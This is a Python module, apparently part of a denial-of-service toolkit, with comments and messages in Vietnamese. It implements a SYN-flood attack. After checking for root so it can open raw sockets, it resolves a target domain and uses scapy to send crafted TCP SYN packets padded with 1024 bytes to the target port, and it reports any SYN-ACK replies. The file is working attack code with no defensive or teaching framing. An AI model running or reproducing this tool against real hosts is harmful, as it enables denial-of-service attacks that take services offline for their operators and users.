import socket
from random import randint

from colorama import Fore as F
from scapy.all import Raw, sr1
from scapy.layers.inet import IP, TCP

from tools.addons.ip_tools import get_target_domain


def check_root_access() -> bool:
    """Kiểm tra quyền root (yêu cầu để sử dụng socket raw)."""
    try:
        # Tạo thử socket raw để kiểm tra quyền root
        socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        return True
    except PermissionError:
        print(f"{F.RED}[!] Quyền root là bắt buộc để thực hiện SYN-FLOOD attack{F.RESET}")
        return False


def flood(target: str) -> None:
    """Gửi gói SYN đến mục tiêu.

    Args:
        - target - Địa chỉ mục tiêu

    Returns:
        None
    """
    if not check_root_access():
        return

    # Xử lý tên miền và cổng từ đầu vào mục tiêu
    try:
        domain, port = get_target_domain(target)
        ip_addr = socket.gethostbyname(domain)
    except socket.gaierror:
        print(f"{F.RED}[!] Không thể xác định địa chỉ IP cho {target}{F.RESET}")
        return

    # Thiết lập các lớp IP và TCP
    ip_layer = IP(dst=ip_addr)
    tcp_layer = TCP(sport=(sport := randint(1024, 65536)), dport=port, flags="S")
    data = Raw(b"X" * 1024)
    packet = ip_layer / tcp_layer / data

    # Gửi gói tin
    try:
        ans = sr1(packet, verbose=0)
        if ans and ans[1].flags.flagrepr() == "SA":
            print(f"--> Socket trên Port {F.BLUE}{sport:<5}{F.RESET} đã gửi gói SYN")
    except Exception as e:
        print(f"{F.RED}[!] Lỗi khi gửi gói tin: {e}{F.RESET}")
